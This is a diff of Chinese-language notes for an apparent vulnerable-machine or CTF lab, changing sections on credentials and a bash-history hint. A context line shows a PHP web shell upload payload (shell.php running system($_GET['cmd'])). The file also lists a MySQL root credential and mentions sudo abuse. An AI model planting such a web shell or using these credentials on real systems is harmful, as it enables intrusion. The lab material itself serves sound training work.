@@ -2,7 +2,7 @@
 
 ## 凭证信息 (Credentials)
 
-### 默认配置使用 T1 的凭证 (密码不是加密后的 hash ，用 hash 做的密码)
+###### PS: (密码不是加密后的 hash ，用 hash 做的密码)
 -   **MySQL Root 用户:**
     ```
     T1: root:$1$0kRGbLi5$o1jTxIVwcDWSOcKtTLukM1
@@ -119,8 +119,10 @@ filename=shell.php&content=<?php system($_GET['cmd']); ?>
 -   `welcome` 用户的 Bash 历史记录文件 (`/home/welcome/.bash_history`) 中包含了一些敏感信息。
 -   **提示信息:** 在 `/home/welcome/.bash_history` 文件中可以找到以下内容：
     ```
+    su -
+    $1$0kRGbLi5$o1jTxIVwcDWSOcKtTLukM1
+    ```
     
-
 ## Sudo 滥用
 -   www-data 用户:
 ```bash
